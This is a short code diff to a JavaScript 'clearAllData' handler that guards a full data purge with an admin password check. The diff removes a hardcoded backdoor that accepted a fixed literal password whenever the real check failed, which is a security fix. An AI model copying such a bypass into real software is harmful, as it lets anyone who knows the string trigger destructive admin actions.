@@ -550,10 +550,6 @@ const clearAllData = async (req, res) => {
       isPasswordValid = await adminUser.matchPassword(password);
     }
 
-    if (!isPasswordValid && password === 'ddmarket468') {
-      isPasswordValid = true;
-    }
-
     if (!isPasswordValid) {
       return res.status(401).json({ message: 'Incorrect admin password. Data purge cancelled.' });
     }
